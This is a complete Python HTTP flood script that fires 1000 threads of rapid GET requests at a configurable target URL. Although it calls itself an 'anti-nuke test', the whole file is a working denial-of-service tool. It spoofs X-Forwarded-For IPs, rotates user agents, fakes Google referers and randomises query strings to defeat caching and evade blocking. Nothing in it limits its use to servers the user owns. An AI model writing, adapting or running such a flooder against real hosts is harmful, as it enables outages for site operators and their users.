import threading, requests, random, string, time

TARGET_URL = "http://yourpanel.com"  # 👈 Tumhara panel URL ya IP
THREADS = 1000                       # Heavy threads
REQUESTS_PER_THREAD = 100
DELAY = 0.001                        # Super fast

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 10)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "curl/7.68.0",
    "Wget/1.21.1"
]

def generate_random_path():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def attack(thread_id):
    for i in range(REQUESTS_PER_THREAD):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Referer": f"https://google.com/{generate_random_path()}",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }

        try:
            url = f"{TARGET_URL}?r={generate_random_path()}"
            response = requests.get(url, headers=headers, timeout=5)
            print(f"[T{thread_id}] ✅ {response.status_code}")
        except Exception as e:
            print(f"[T{thread_id}] ❌ Error: {e}")

        time.sleep(DELAY)

def main():
    print(f"🚀 Starting anti-nuke test on {TARGET_URL} with {THREADS} threads")
    threads = []
    for t_id in range(THREADS):
        t = threading.Thread(target=attack, args=(t_id,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print("✅ Test complete.")

if __name__ == "__main__":
    main()
